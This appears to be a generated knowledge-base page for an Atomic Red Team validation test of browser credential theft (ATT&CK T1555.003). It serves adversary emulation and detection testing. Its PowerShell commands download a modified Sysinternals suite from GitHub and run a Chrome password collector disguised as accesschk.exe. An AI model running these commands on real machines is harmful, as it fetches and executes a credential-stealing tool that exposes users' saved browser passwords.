---
atomic_guid: "8c05b133-d438-47ca-a630-19cc464c4622"
title: "Run Chrome-password Collector"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "8c05b133-d438-47ca-a630-19cc464c4622"
  - "Run Chrome-password Collector"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Run Chrome-password Collector

A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.

Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of PathToAtomicsFolder\..\ExternalPayloads\sysinternals\passwordsdb.

Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)

## Metadata

- Atomic GUID: 8c05b133-d438-47ca-a630-19cc464c4622
- Technique: T1555.003: Credentials from Password Stores: Credentials from Web Browsers
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1555.003/T1555.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.003]]

## Input Arguments

### file_path

- description: File path for modified Sysinternals
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads

## Dependencies

Modified Sysinternals must be located at #{file_path}

### Prerequisite Check

```powershell
if (Test-Path "#{file_path}\SysInternals") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
Expand-Archive "#{file_path}\Modified-SysInternalsSuite.zip" "#{file_path}\sysinternals" -Force
Remove-Item "#{file_path}\Modified-SysInternalsSuite.zip" -Force
```

## Executor

- name: powershell

### Command

```powershell
Start-Process "#{file_path}\Sysinternals\accesschk.exe" -ArgumentList "-accepteula ."
```

### Cleanup

```powershell
Remove-Item "#{file_path}\Sysinternals" -Force -Recurse -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
